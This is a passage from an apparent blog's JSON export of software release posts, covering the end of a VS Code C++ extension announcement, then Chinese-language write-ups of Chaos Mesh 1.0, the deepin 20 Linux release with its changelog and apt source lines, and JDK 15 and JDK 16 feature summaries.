IDE](https://marketplace.visualstudio.com/items?itemName=platformio.platformio-ide), a popular extension for embedded development in VS Code. Version 1.0 of the C++ extension meets the high bar we, and our customers, have set for quality—but we won’t stop there. Performance will continue to be a prioritization for the C++ extension.\n\n## Give it a try\n\nInstall the [C/C++ Extension Pack](https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools-extension-pack), check out the new [*Configure C++ IntelliSense in Visual Studio Code* video tutorial](https://aka.ms/cpp-intelliSense), and let us know what you think! You can also find Hello World build and debug tutorials for different compilers and platforms in the [VS Code C++ documentation](https://aka.ms/cpphelloworld).\n\nIf you run into any issues, or have any suggestions, please report them in the [Issues section of our GitHub repository](https://github.com/Microsoft/vscode-cpptools/issues). You can also join our Insiders program and get access to early builds of our release by going to **File > Preferences > Settings** and under **Extensions > C/C++,** change the “C_Cpp: Update Channel” to “Insiders”.\n\nWe can be reached via the comments below or in email at [visualcpp@microsoft.com](mailto:visualcpp@microsoft.com). You can also find our team on Twitter at [@VisualC](https://twitter.com/visualc).\n\n\n","categories":["release"],"tags":["release","C++","Visual Studio Code","vscode"]},{"title":"Chaos Mesh® 1.0 GA，让混沌工程变得简单！","url":"/release/chaos-mesh-1-0-ga/","content":"\n> 本文转载自 [Chaos Mesh® 1.0 GA，让混沌工程变得简单！](https://pingcap.com/blog-cn/chaos-mesh-1.0-ga/)\n\nChaos Mesh 是一个云原生的混沌测试平台，在去年的最后一天，我们开源了这个项目，以帮助大家更好的进行混沌实验。从开源到现在近一年的时间里，Chaos Mesh 在所有贡献者的共同努力下，在不断完善新功能的同时，也在易用性和稳定性上取得了阶段性的成果。今天，我们自豪的宣布 Chaos Mesh 1.0 正式发布！\n\nChaos Mesh 1.0 是一个里程碑，不仅支持更多混沌注入的类型，提高了框架组件的稳定性，并且增加了 Chaos Dashboard 组件用来改善 Chaos Mesh 的易用性。下面请跟随我们的脚步梳理 Chaos Mesh 1.0 有什么样的惊喜。\n\n<!-- more -->\n\n## 核心亮点\n\n### 1. 丰富易用的混沌实验类型\n\n混沌实验的核心是注入故障，Chaos Mesh 从分布式系统的出发，充分考虑分布式系统可能出现的故障，提供更加全面、细粒度的故障类型，能全方位的帮用户对网络、磁盘、文件系统、操作系统等进行故障注入。同时，使用 Chaos Mesh，不需要应用做任何修改，做到真正的被测试系统无感知。Chaos Mesh 目前支持的故障注入有：\n\n- pod-kill：模拟 Kubernetes Pod 被 kill。\n- pod-failure：模拟 Kubernetes Pod 持续不可用，可以用来模拟节点宕机不可用场景。\n- container-kill：模拟 Container 被 kill。\n- network-latency：模拟网络延迟。\n- network-loss：模拟网络丢包。\n- network-duplication：模拟网络包重复。\n- network-corrupt：模拟网络包损坏。\n- network-partition：模拟网络分区。\n- cpu-burn：模拟 CPU 压力。\n- memory-burn：模拟 Memory 压力。\n- clock-skew：模拟时钟偏移。\n- io-latency：模拟文件系统 I/O 延迟。\n- io-fault：模拟文件系统 I/O 错误。\n- io-attribution-override：模拟文件异常。\n- kernel-injection: 模拟内核故障。\n\n### 2. 简单易用的可视化界面\n\nChaos Mesh 从用户角度出发，不仅可以提供通过 YAML 文件定义混沌实验的方式，还单独开发了 Chaos Dashbaord 组件，提供可视化支持。Chaos Dashboard 极大简化了混沌实验的复杂度，用户可以直接通过可视化界面来管理和监控混沌实验，仅需鼠标点一点就能够定义混沌实验的范围、指定混沌注入类型、定义调度规则，以及在界面上获取到混沌实验的结果等。\n\n![dashboard](https://up-img.yonghong.tech/pic/2020/10/04-11-25-1-dash-0jvUgx.gif)\n\n### 3. 提供 Grafana 插件支持\n\nChaos Mesh 为了进一步提高混沌实验的可观测性，单独开发了 [Grafana 插件](https://github.com/chaos-mesh/chaos-mesh-datasource)，方便用户直接将混沌实验的运行信息展示在自己的监控面板上。用户在 Grafana 上安装了此插件后，可以直接在应用的监控面板上开启混沌实验信息按钮，此时混沌实验的相关信息会以 [Annotations](https://grafana.com/docs/grafana/latest/dashboards/annotations/) 的方式在当前的面板上展示出来，这样用户就可以在一个界面上同时观察到应用的运行情况以及当前运行的混沌实验信息。\n\n![Grafana插件](https://up-img.yonghong.tech/pic/2020/10/04-11-25-2-Grafana%E6%8F%92%E4%BB%B6-MbtpyP.png)\n\n### 4. 安全可控的混沌实验\n\n当在进行混沌实验的时候，我们需要严格的控制实验范围，只影响需要测试的应用程序，避免导致整体应用的雪崩。Chaos Mesh 在 1.0 版本中不仅提供了丰富的 Selectors 用来控制实验范围，还支持设置被保护的 Namespaces 用来保护重要应用。此外，在 1.0 中 Chaos Mesh 还支持在 Namespace 权限使用，也就是说用户可以在单个 Namespace 下安装 Chaos Mesh 或者是把 Chaos Mesh 的权限范围限制在特定某个 Namespace 下，如此一来可以更大程度控制实验的“爆炸半径”，提供更加安全的混沌实验体现。\n\n## 快速体验\n\n大家通过 install.sh 安装脚本或者是使用 Helm 工具就可以在自己的 Kubernetes 环境下快速的部署 Chaos Mesh，具体安装步骤可以参考 [Chaos Mesh 部署文档](https://chaos-mesh.org/docs/installation/installation)。此外社区的小伙伴也贡献了在线 Chaos Mesh 简单教程，想要快速尝试的小伙伴也可以直接按照课程，在线试用，课程地址：https://chaos-mesh.org/interactiveTutorial。\n\n对于 1.0 GA 之前版本的用户，请参考 [1.0 Release Note](https://github.com/chaos-mesh/chaos-mesh/releases/tag/v1.0.0) 了解 1.0 的变更内容和升级指南。\n\n## 致谢\n\n感谢所有 [Chaos Mesh 的贡献者](https://github.com/chaos-mesh/chaos-mesh/graphs/contributors) ，Chaos mesh 能够走到 1.0 GA 离不开每一位贡献者的努力！\n\n最后欢迎大家为 Chaos Mesh 提交 issue 或者参考文档开始提交代码，Chaos Mesh 期待大家的参与和反馈！","categories":["release"],"tags":["release","Chaos Mesh"]},{"title":"深度操作系统 20——崭新视界，创无止境","url":"/release/deepin-20/","content":"\n深度操作系统是一个致力于为全球用户提供美观易用、安全可靠的Linux发行版。\n\n深度操作系统 20正式版（1002）采取统一的设计风格，从桌面环境和应用进行重新设计，带来焕然一新的视觉感受。底层仓库升级到Debian 10.5，系统安装采用双内核机制（Kernel 5.4、Kernel 5.7），全面提升系统稳定性和兼容性。全新设计的启动器菜单、指纹识别、系统安全增强等，系统部分预装应用升级到最新版本，只为给你更好体验。\n\n## 特性\n\n### 统一风格的桌面环境\n\n别出心裁的图标设计，焕然一新的图形界面，自然、平滑的动画过渡效果，更有独树一帜的圆角窗口设计，精美绝伦的多任务视图，处处精心，只为给你细腻自然的品质体验。\n\n> **|** 支持黑白主题、透明度调节、色温调节自定义、电源电池设置等贴心功能。\n\n![统一风格的桌面环境](https://up-img.yonghong.tech/pic/2020/09/27-16-23-27-16-23-iRV5BI-ATr2ZD-JjGJ5m.jpg)\n\n<!-- more -->\n\n### 个性贴心的通知管理\n\n增强通知中心功能，支持设置通知时提示声音、锁屏时显示消息、仅在通知中心显示、显示消息预览，必要应用强提醒、特定应用弱提醒或不提醒，个性化你的消息通知，在不错过任何重要提醒的同时，避免不必要的打扰。\n\n![个性贴心的通知管理](https://up-img.yonghong.tech/pic/2020/09/27-16-24-27-16-24-hJCvMy-WLeZpv-mvBBhl.jpg)\n\n### 系统支持双内核安装\n\n系统安装界面提供双内核选项，Kernel 5.4（LTS）和Kernel 5.7（Stable）以及Safe Graphics模式，保证系统安装更多选择，提升系统整体的稳定性、兼容性，最新的内核支持更多的硬件设备。\n\n![系统支持双内核安装](https://up-img.yonghong.tech/pic/2020/09/27-16-24-27-16-24-WspxeU-zvptvY-YvoU8n.jpg)\n\n### 更易用的新版安装器\n\n化繁为简的设计和交互，保证更一致的操作习惯。新版的安装器界面，只需按照操作向导提示安装即可，在硬盘分区操作中，提供手动和全盘安装两种模式，并且支持全盘加密功能。\n\n> **|** 注：对于N卡用户，安装器自动检测并提供安装闭源驱动选项。\n\n![更易用的新版安装器](https://up-img.yonghong.tech/pic/2020/09/27-16-25-27-16-24-bumxXq-GrMhtE-20200927162509782-giomVd.jpg)\n\n### 管理方便的应用商店\n\n应用商店的不同类别应用，覆盖了生活、工作的主要使用场景，本次新增一键更新、应用筛选等功能，带来更便捷的应用管理体验，同时也兼容部分Wine应用，并达到原生应用的体验。\n\n![管理方便的应用商店](https://up-img.yonghong.tech/pic/2020/09/27-16-25-27-16-25-RxrLgT-5Q3bom-UfkDuS.jpg)\n\n\n### 好用安全的指纹识别\n\n全新的指纹功能框架，提供了更细腻的引导交互和更准确的场景提示。可使用指纹进行解锁登录、验证身份和管理员权限。现已支持多款国产指纹硬件。\n\n![好用安全的指纹识别](https://up-img.yonghong.tech/pic/2020/09/27-16-25-27-16-25-aejF3j-Pz3lYF-4fHAhu.jpg)\n\n------\n\n## 系统更新日志（15.11->20正式版）\n\n### 新增功能\n\n- 新增设备管理器，查看和管理硬件设备\n- 新增字体管理器，支持安装、管理字体，个性化文字内容显示\n- 新增茄子，满足拍照、录制视频需求\n- 新增用户反馈，快来深度社区和其他深粉一起交流讨论吧\n- 新增画板，随心创作你的想法，简直设计爱好者福音\n- 新增日志收集工具，查看系统同步的日志类型，快速定位问题\n- 新增图标主题，带来更丰富的显示体验\n- 新增商店应用更新功能，分类交互显示增强，详情页面布局调整\n- 增强语音记事本，结合记事本和语音记录功能\n- 截图、录屏应用合并，记录内容更省心\n- 替换文档查看器、归档管理器、编辑器，更好的交互、视觉体验\n\n### 其他更新\n\nDDE\n\n- 优化系统待机唤醒体验\n- 优化自动更换壁纸功能体验\n- 修复高分屏切换分辨率后出现花屏现象\n- 修复在控制中心设置字体大小为20，登录页面字体没有生效\n- 修复输入正确账号密码登录云同步，又弹出账号密码输入框\n- 修复外接无线网卡和蓝牙，机器没有响应的问题\n- 修复双屏模式下任务栏选择状态一直隐藏，桌面的图标部分消失\n- 修复配合N卡切换闭源驱动失败的问题\n- 修复任务栏概率性显示2个文件管理器图标\n- 修复数位板下列表里\"鼠标\"和\"笔\"的设置相反的问题\n- 修复每点击一次任务栏上的回收站图标，都会打开一个窗口\n\n语音记事本\n\n- 优化整体功能操作，记录管理更便捷\n- 修复启动系统后第一次打开操作卡顿的问题\n- 修复添加文字区域点击鼠标右键，“语音朗读”，“翻译”，“语音听写”文字未去掉\n- 修复文本内容太长时，剪贴板中没有显示省略号\n\n输入法\n\n- 优化输入法配置预装五笔输入法\n- 修复输入法设置页面“ctrl”属性设置置灰\n- 修复恢复默认键盘布局不生效\n\n任务栏\n\n- 优化任务栏插件区的网络图标显示\n- 优化qBittorrent应用托盘显示\n- 优化右下角电池图标显示\n- 修复语音记事本的音量文字部分显示重叠\n\n相册\n\n- 修复打开图片占用CPU过高的问题\n\n控制中心\n\n- 优化时区设置显示的地图信息\n- 优化拔掉数位板，控制中心界面显示只有二级菜单\n- 修复蓝牙无法连接设备的问题\n- 修复选择设备后，选择后背景图层覆盖文字\n- 修复电源管理中关闭显示器时间设置无效\n- 修复网络应用代理设置无效的端口可以保存成功\n- 修复设置屏幕缩放为1.25或1.5，打开通知栏后，点击红色区域无法关闭通知栏\n- 修复系统重启或开机后，无线网络显示连接但没有网络的问题\n- 修复更新/更新设置的图标点击之后的状态显示不对\n- 修复网络账户登出后应用商店同步登出，图像显示未同步退出的问题\n- 修复系统快捷键和应用快捷键冲突的问题\n- 修复插上USB数位板，控制中心无数位板栏\n- 修复插上USB无线网卡后，设备有输入但控制中心和任务栏无显示\n- 修复插入usb耳机后重启查看高级设置，界面前后不一致的问题\n- 修复控制中心多了一个High Contrast图标主题\n- 修复在扩展模式下接入双屏，显示器花屏的问题\n- 修复任务栏上出现两个控制中心的图标\n- 修复设置外接显示器为主屏时，截图功能异常\n- 修复图标主题设置bloom-classic，启动器里面的\"文档查看器\"图标显示锯齿\n- 修复系统待机休眠唤醒后，无法识别网络的问题\n- 修复wifi图标个别主题没有显示\n\n日历\n\n- 修复安装系统后打开日历，左上角图标跟实际日期不一致\n\n音乐\n\n- 修复偶像歌手名称下拉选项与音乐页面分离的问题\n- 修复根据歌手不能搜索到歌曲\n\n通知中心\n\n- 修复系统语言为英文时，通知消息为中文\n\n应用商店\n\n- 修复应用点击安装无反应，实际可以安装成功没有进度显示\n- 修复点击商店分类缓冲超过15秒，提示网络错误的问题\n- 修复有应用下载或者报错时，下载管理列表信息中显示空白\n- 修复在搜索栏搜索应用出现提示栏时，移动应用商店框后提示栏不会跟随移动\n- 修复商店安装wine应用，概率性出现提示依赖错误的问题\n\n安装器\n\n- 优化时区设置页里的map划分\n- 修复加密安装完以后重启电脑，安装器全盘加密失败\n- 修复手动分区安装，U盘没有自动挂载，文件管理器不显示U盘信息\n- 修复全盘安装时，全盘加密选项不生效\n\n打印管理器\n\n- 修复：佳能驱动安装成功后下发网络打印任务，没有文件在打印的问题\n\n深度影院\n\n- 修复播放视频时点击任务栏音量，单独调节影院音量播放不均匀且显示名称重叠\n- 修复播放视频时，进度栏边角没有做虚化处理\n- 修复播放视频CPU占用过高，4K视频不能硬解的问题\n\n设备管理器\n\n- 修复连接蓝牙适配器，概况里显示未知的问题\n\n归档管理器\n\n- 修复压缩包解压完成后界面文字错误\n- 修复下载的chrome插件crx(重命名zip后)或zip格式，使用自带压缩应用打开需要密码\n- 修复在设置中是否勾选“当解压完成后自动打开文件夹”，都会打开文件夹的问题\n- 修复解压压缩包文件后，文件名称显示乱码\n\n第三方应用\n\n- 优化chrome在任务栏驻留体验\n- 修复企业微信频繁崩溃的问题\n- 修复打开文件，永中office不自动弹出打开页面且无法进行粘贴快捷键粘贴图片\n- 修复WPS2019发送到任务栏，以及打开后在任务栏图标显示均为锯齿的问题\n- 修复显示消息记录面板中，QQ的消息历史无法阅读\n\ndeepin-wine\n\n- 修复修复企业微信剪切图片切换窗口后崩溃的问题\n- 修复微信发送多个文件失败的问题\n- 修复QQ图片无法加载的问题\n- 修复企业微信图片分配内存异常的问题\n- 修复企业微信会议/直播，提示版本低无法使用的问题\n- 修复语音通话没声音的问题\n\n文档查看器\n\n- 优化打开多个PDF文档时以标签形式显示\n- 修复同时打开3个PDF文档后，关闭按钮不可用的问题\n\n系统监视器\n\n- 优化整体功能体验，查看系统状态更清晰\n- 修复某些语言下名称显示错误\n\n窗口管理器\n\n- 修复alt+tab切换窗口管理器时，部分wine应用显示图标模糊\n\n日志收集工具\n\n- 修复日志收集工具的时间显示超前的问题\n- 修复日志收集工具导出按钮概率性弹不出保存对话框\n\n文本编辑器\n\n- 优化编辑器窗口拖动响应区域大小\n- 修复搜索相同字符时，“上一个”、“下一个”均无反应\n\n软件包安装器\n\n- 优化批量安装 deb 软件包体验\n\n帮助手册\n\n- 优化更新帮助手册介绍内容\n- 优化截图录屏的英文介绍内容\n\n## 系统更新日志（20（1001）->20正式版）\n\nDDE\n\n- 修复配合N卡切换闭源驱动失败的问题\n- 修复任务栏概率性显示2个文件管理器图标\n- 修复数位表下列表里\"鼠标\"和\"笔\"的设置相反的问题\n- 修复每点击一次任务栏上的回收站图标，都会打开一个窗口\n\n相册\n\n- 修复打开图片占用CPU过高的问题\n\n任务栏\n\n- 优化qBittorrent应用托盘显示\n- 优化右下角电池图标显示\n- 修复语音记事本的音量文字部分显示重叠\n\n控制中心\n\n- 修复在扩展模式下接入双屏，显示器花屏的问题\n- 修复任务栏上出现两个控制中心的图标\n- 修复设置外接显示器为主屏时，截图功能异常\n- 修复图标主题设置bloom-classic，启动器里面的\"文档查看器\"图标显示锯齿\n- 修复系统待机休眠唤醒后，无法识别网络的问题\n- 修复wifi图标个别主题没有显示\n\n安装器\n\n- 修复全盘安装时，全盘加密选项不生效\n\n归档管理器\n\n- 修复下载的chrome插件crx(重命名zip后)或zip格式，使用自带压缩应用打开需要密码\n- 修复在设置中是否勾选“当解压完成后自动打开文件夹”，都会打开文件夹的问题\n- 修复解压压缩包文件后，文件名称显示乱码\n\n日志收集工具\n\n- 修复日志收集工具的时间显示超前的问题\n- 修复日志收集工具导出按钮概率性弹不出保存对话框\n\n日历\n\n- 修复安装系统后打开日历，左上角图标跟实际日期不一致\n\n应用商店\n\n- 修复在搜索栏搜索应用出现提示栏时，移动应用商店框后提示栏不会跟随移动\n- 修复商店安装wine应用，概率性出现提示依赖错误的问题\n\n文本编辑器 ￼\n\n- 优化编辑器窗口拖动响应区域大小\n- 修复搜索相同字符时，“上一个”、“下一个”均无反应\n\n帮助手册\n\n- 优化截图录屏的英文介绍内容\n\n输入法\n\n- 修复恢复默认键盘布局不生效\n\n第三方应用\n\n- 修复显示消息记录面板中，QQ的消息历史无法阅读\n- 修复系统自带chromium浏览器登录论坛密码输入正确，但依旧提示未登录\n\n深度影院\n\n- 修复播放视频CPU占用过高，4K视频不能硬解的问题\n\n窗口管理器\n\n- 修复alt+tab切换窗口管理器时，部分wine应用显示图标模糊\n\n已知问题\n\n- Super+S快捷键调用窗口管理器，通过触摸板四指滑动后高概率崩溃\n- 任务栏位置调整到左侧，魔灯窗口依然从底部调出\n\n------\n\n## ISO下载方式\n\n64位：[点此下载](https://www.deepin.org/zh/download/)\n\n其他下载点：\n\n[百度云](https://pan.baidu.com/s/1rxKAKJDnFTtWgFNj-U_a-Q)（3m4f）、[OSDN](https://osdn.net/projects/deepin/storage/20/)、[Sourceforge](https://sourceforge.net/projects/deepin/files/20/)、[Google Drive](https://drive.google.com/drive/folders/1vM-Ud8m63RI3sUIWiKiO3_7DLKzbIkHh?usp=sharing)、BT、[国内外镜像源](https://www.deepin.org/mirrors/releases/)\n\n> 全球排名：https://distrowatch.com/table.php?distribution=deepin\n\n \n\n跨版本升级操作如下：\n\n1、将15.11官方源替换成20官方源（/etc/apt/sources.list）\n\ndeb [by-hash=force] https://community-packages.deepin.com/deepin/ apricot main contrib non-free\n\n2、新增20官方商店源（/etc/apt/sources.list.d/appstore.list ），无list文件创建后添加：\n\ndeb https://community-store-packages.deepin.com/appstore eagle appstore\n\n------\n\n## 关于我们\n\n深度操作系统是一款针对普通用户而发行的开源桌面系统，您可自由下载、分发、修改和使用。\n\n欢迎您关注我们的[微博](http://weibo.com/linuxdeepinnew)、[微信](https://www.deepin.org/wp-content/uploads/2017/01/pc_social_weixin.jpg)（深度操作系统）、[Twitter](https://twitter.com/linux_deepin)、[Facebook](https://www.facebook.com/deepinlinux)、[Github](https://github.com/linuxdeepin)以第一时间获取最新动态和源代码，同时也欢迎您前往我们的论坛，与我们交流和分享您的快乐。\n\n最后，我们郑重感谢为深度操作系统提供测试、文档、翻译和镜像支持的社区团队与企业，感谢你们的无私的贡献，开源有你们更精彩。也要感谢一直支持、理解和等待我们的用户，是你们给了深度操作系统不断前行的动力，和不断自我修正的勇气。\n\n## 参考链接\n\n- https://www.deepin.org/zh/2020/09/11/deepin-20-innovation-is-ongoing/","categories":["release"],"tags":["Linux","release","deepin","深度操作系统","深度","操作系统"]},{"title":"JDK 15 正式发布！","url":"/release/jdk-15/","content":"\nJDK 15 在 2020 年 9 月 15 号正式发布了，这次发布的主要功能有：\n\n- JEP 339：EdDSA 数字签名算法\n- JEP 360：密封类（预览）\n- JEP 371：隐藏类\n- JEP 372：删除 Nashorn JavaScript 引擎\n- JEP 373：重新实现 Legacy DatagramSocket API\n- JEP 374：重新实现 DatagramSocket API\n- JEP 375：实例模式匹配（第二次预览）\n- JEP 377：ZGC：一个可扩展的低延迟垃圾收集器\n- JEP 378：文本块\n- JEP 379：低暂停时间垃圾收集器\n- JEP 381：移除 Solaris 和 SPARC 端口\n- JEP 383：外部存储器访问 API（第二个内置程序）\n- JEP 384：Records（第二次预览）\n- JEP 385：不推荐的 RMI 激活去除\n\n> JEP：JDK Enhancement Proposals，JDK 增强建议，也就是 JDK 的特性新增和改进提案。\n\n<!-- more -->\n\n这些年发布的版本对应的 JEPs 数量如下图所示：![img](https://up-img.yonghong.tech/pic/2020/09/27-11-07-a746bdfa-704a-439e-bd9c-883fa7e014cd-0oQ7ia.png)\n\n\n\n### 发布版本说明\n\n根据发布的规划，这次发布的 JDK 15 将是一个短期的过度版，只会被 Oracle 支持（维护）6 个月，直到明年 3 月的 JDK 16 发布此版本将停止维护。而 Oracle 下一个长期支持版（LTS 版）会在明年的 9 月份候发布（Java 17），LTS 版每 3 年发布一个，上一次长期支持版是 18 年 9 月发布的 JDK 11。\n\n\n\n### JDK 15 新功能说明\n\nJDK 15 为用户提供了十四项主要的增强/更改，包括一个孵化器模块，三个预览功能，两个不推荐使用的功能以及两个删除功能。\n\n\n\n#### 1、EdDSA 数字签名算法\n\n新加入 Edwards-Curve 数字签名算法（EdDSA）实现加密签名。在许多其它加密库（如 OpenSSL 和 BoringSSL）中得到支持。与 JDK 中的现有签名方案相比，EdDSA 具有更高的安全性和性能。这是一个新的功能。\n\n\n\n#### 2、隐藏类\n\n此功能可帮助需要在运行时生成类的框架。框架生成类需要动态扩展其行为，但是又希望限制对这些类的访问。隐藏类很有用，因为它们只能通过反射访问，而不能从普通字节码访问。此外，隐藏类可以独立于其他类加载，这可以减少框架的内存占用。这是一个新的功能。\n\n\n\n#### 3、重新实现 DatagramSocket API\n\n重新实现旧版 DatagramSocket API，更简单、更现代的实现来代替`java.net.DatagramSocket`和`java.net.MulticastSocket`API 的基础实现，提高了 JDK 的可维护性和稳定性。\n\n\n\n#### 4、ZGC 功能转正\n\nZGC 已由JEP 333集成到JDK 11 中，其目标是通过减少 GC 停顿时间来提高性能。借助 JEP 377，ZGC 从预览功能转变为生产功能。\n\n\n\n#### 5、文本块功能转正\n\n文本块由JEP 355在 2019 年提出，文本块是一种多行字符串文字，它避免了大多数转义序列的需要，以一种可预测的方式自动设置字符串的格式，并在需要时使开发人员可以控制格式。借助 JEP 378，文本块已成为 Java 语言的永久功能。\n\n\n\n#### 6、Shenandoah 垃圾回收算法转正\n\nShenandoah 垃圾回收从实验特性变为产品特性。这是一个从 JDK 12 引入的回收算法，该算法通过与正在运行的 Java 线程同时进行疏散工作来减少 GC 暂停时间。Shenandoah 的暂停时间与堆大小无关，无论堆栈是 200 MB 还是 200 GB，都具有相同的一致暂停时间。\n\n\n\n#### 7、密封类（预览）\n\n通过密封的类和接口来增强 Java 编程语言，用于限制超类的使用，密封的类和接口限制其它可能继承或实现它们的其它类或接口。\n\n\n\n#### 8、instanceof 自动匹配模式（预览）\n\n**旧写法：**\n\n```java\n// 先判断类型\nif (obj instanceof String) {\n    // 然后转换\n    String s = (String) obj;\n    // 然后才能使用\n}\n```\n\n**新写法：**\n\n```java\nif (obj instanceof String s) {\n    // 如果类型匹配 直接使用\n} else {\n    // 如果类型不匹配则不能直接使用\n}\n```\n\n这是第二次预览该功能，我们已经在 Java 14 中首次预览过该特性。\n\n\n\n#### 9、Records Class（预览）\n\nRecords Class 也是第二次出现的预览功能，它在 JDK 14 中也出现过一次了，使用 Record 可以更方便的创建一个常量类，使用的前后代码对比如下。\n\n**旧写法：**\n\n```\nclass Point {\n    private final int x;\n    private final int y;\n\n    Point(int x, int y) { \n        this.x = x;\n        this.y = y;\n    }\n\n    int x() { return x; }\n    int y() { return y; }\n\n    public boolean equals(Object o) { \n        if (!(o instanceof Point)) return false;\n        Point other = (Point) o;\n        return other.x == x && other.y = y;\n    }\n\n    public int hashCode() {\n        return Objects.hash(x, y);\n    }\n\n    public String toString() { \n        return String.format(\"Point[x=%d, y=%d]\", x, y);\n    }\n}\n```\n\n**新写法：**\n\n```java\nrecord Point(int x, int y) { }\n```\n\n也就是说在使用了 record 之后，就可以用一行代码编写出一个常量类，并且这个常量类还包含了构造方法、toString()、equals() 和 hashCode() 等方法。\n\n\n\n#### 10、外部存储器访问 API（预览）\n\n目的是引入一个 API，以允许 Java 程序安全有效地访问 Java 堆之外的外部内存。这同样是 Java 14 的一个预览特性。\n\n\n\n#### 11、其它功能\n\n其它功能里面还有一些弃用和不建议使用的功能，比如移除了 Nashorn JavaScript 引擎，同时也移除了删除 Solaris 和 SPARC 端口，并标记了一些弃用功能。\n\n\n\n### 参考\n\n官方日志：https://openjdk.java.net/projects/jdk/15/\n\n\n","categories":["release"],"tags":["JDK","Java","release","JEP","EdDSA","ZGC","Records"]},{"title":"JDK 16 正式发布！","url":"/release/jdk-16/","content":"\nJDK 16 在 2021 年 3 月 16 日正式发布了，这次发布的主要功能有：\n\n- JEP 338: Vector API (Incubator)\n- JEP 347: Enable C++14 Language Features\n- JEP 357: Migrate from Mercurial to Git\n- JEP 369: Migrate to GitHub\n- JEP 376: ZGC: Concurrent Thread-Stack Processing\n- JEP 380: Unix-Domain Socket Channels\n- JEP 386: Alpine Linux Port\n- JEP 387: Elastic Metaspace\n- JEP 388: Windows/AArch64 Port\n- JEP 389: Foreign Linker API (Incubator)\n- JEP 390: Warnings for Value-Based Classes\n- JEP 392: Packaging Tool\n- JEP 393: Foreign-Memory Access API (Third Incubator)\n- JEP 394: Pattern Matching for instanceof\n- JEP 395: Records\n- JEP 396: Strongly Encapsulate JDK Internals by Default\n- JEP 397: Sealed Classes (Second Preview)\n\n<!-- more -->\n\n---\n\n### JEP 338: Vector API (Incubator)\n\nVector API 这是一个新的初始迭代孵化器模块，模块包：`jdk.incubator.vector`，用于表示在运行时可靠地编译到支持的 CPU 架构上的最佳矢量硬件指令的矢量计算。\n\n### JEP 347: Enable C++14 Language Features\n\n允许在 JDK 底层的 C ++ 源代码中使用 C ++ 14 的新语言特性，并且提供了在 HotSpot 虚拟机代码中，哪些代码使用了这些新特性的指南。\n\n### JEP 357: Migrate from Mercurial to Git\n\n将 OpenJDK 社区的源代码存储库从 Mercurial（hg）迁移到 Git。\n\n### JEP 369: Migrate to GitHub\n\n在 GitHub 上托管 OpenJDK 社区的 Git 存储库。\n\n### JEP 376: ZGC: Concurrent Thread-Stack Processing\n\nZGC 是一种较新的垃圾回收器，指在解决 HotSpot 虚拟机中的 GC 停顿及可伸缩问题。\n\nZGC 最早是在 JDK 11 中集成进来的，在 [JDK 15](https://yonghong.tech/release/jdk-15/) 中正式转正。\n\n这个版本则是为了让 ZGC 支持并发栈处理，解决了最后一个重大瓶颈，把 ZGC 中的线程栈处理从安全点移到了并发阶段。并且还提供了一种机制，使得其他 HotSpot 子系统可以通过该机制延迟处理线程栈。\n\n### JEP 380: Unix-Domain Socket Channels\n\nUNIX 域套接字通道，为 `java.nio.channels` 包中的套接字通道和服务端套接字通道 APIs 增加 Unix 域套接字通道所有特性支持。\n\nUNIX 域套接字主要用于同一主机上的进程间通信（IPC），大部分方面与 TCP/IP套接字类似，不同的是 UNIX 域套接字是通过文件系统路径名寻址，而不是通过 IP 地址和端口号。\n\n### JEP 386: Alpine Linux Port\n\n在 x64 和 AArch64 平台体系结构上，将 JDK 移植到 Alpine Linux 以及使用 musl 作为其主要 C 语言库的其他 Linux 发行版中。\n\n### JEP 387: Elastic Metaspace\n\n弹性的元空间，可以帮助 HotSpot 虚拟机，将元空间中未使用的 class 元数据内存更及时地返回给操作系统，以减少元空间的内存占用空间。\n\n另外，还简化了元空间的代码，以降低维护成本。\n\n### JEP 388: Windows/AArch64 Port\n\n将 JDK 移植到 Windows/ AArch64 平台系列。\n\n### JEP 389: Foreign Linker API (Incubator)\n\n引入了一个新的 API，该 API 提供了对本地 native 代码的静态类型访问支持。\n\n### JEP 390: Warnings for Value-Based Classes\n\n基于值的类的警告，将基础类型包装类指定为基于值的类，废除其构造函数以进行删除，从而提示新的弃用警告。并且提供了在任何基于值的类的实例上不正常进行同步的警告。\n\n### JEP 392: Packaging Tool\n\n提供了 jpackage 打包工具，可用于打包独立的 Java 应用程序。\n\njpackage 打包工具是在 JDK 14 中首次作为孵化工具引入的新特性，到了 JDK 15 它仍然还在孵化中，现在它终于转正了。\n\n### JEP 393: Foreign-Memory Access API (Third Incubator)\n\n外部内存访问 API（三次孵化中），引入了一个新的 API，可以帮助 Java 应用程序更安全、有效地访问 Java 堆之外的外部内存。\n\n这个最早在 JDK 14 中成为孵化特性，JDK 15/ JDK 16 中继续二、三次孵化并对其 API 有了一些更新，这个可以在 JDK 17 中好好期待一下转正。\n\n### JEP 394: Pattern Matching for instanceof\n\n模式匹配 for instanceof，相当于是增强的 instanceof，在 JDK 14 中首次成为预览特性，在 JDK 16 中正式转正。\n\n模式匹配的到来将使得 instanceof 变得更简洁、更安全，为什么这么说，请看下面的示例。\n\n正常的 instanceof 写法：\n\n```java\n\nif (object instanceof IPad) {\n    IPad iPad = (IPad) object;\n    // ...\n} else if (object instanceof IPhone) {\n    IPhone iPhone = (IPhone) object;\n    // ...\n}\n```\n\n模式匹配的 instanceof 写法：\n\n```java\nif (object instanceof IPad iPad) {\n    // ...\n} else if (object instanceof IPhone iPhone) {\n    // ...\n}\n```\n\n判断、赋值一步到位。\n\n### JEP 395: Records\n\n简单来说，Records 就是一种新的语法糖，目的还是为了简化代码，在 JDK 14 中首次成为预览特性，在 JDK 16 中正式转正。\n\nRecords 可以在一定程度上避免低级冗余的代码，比如：constructors, getters, equals(), hashCode(), toString() 方法等，相当于 Lombok 的 @Data 注解，但又不能完全替代。\n\n### JEP 396: Strongly Encapsulate JDK Internals by Default\n\nJDK 内部默认强封装，JDK 16 开始对 JDK 内部大部分元素默认进行强封装，sun.misc.Unsafe 之类的关键内部 API 除外，从而限制对它们的访问。\n\n此外，用户仍然可以选择自 JDK 9 以来的默认的宽松的强封装，这样可以帮助用户毫不费力地升级到未来的 Java 版本。\n\n### JEP 397: Sealed Classes (Second Preview)\n\n封闭类（二次预览），可以是封闭类和或者封闭接口，用来增强 Java 编程语言，防止其他类或接口扩展或实现它们。\n\n### 参考\n\n官方日志：\n\n- [https://openjdk.java.net/projects/jdk/16/](https://openjdk.java.net/projects/jdk/16/)\n- 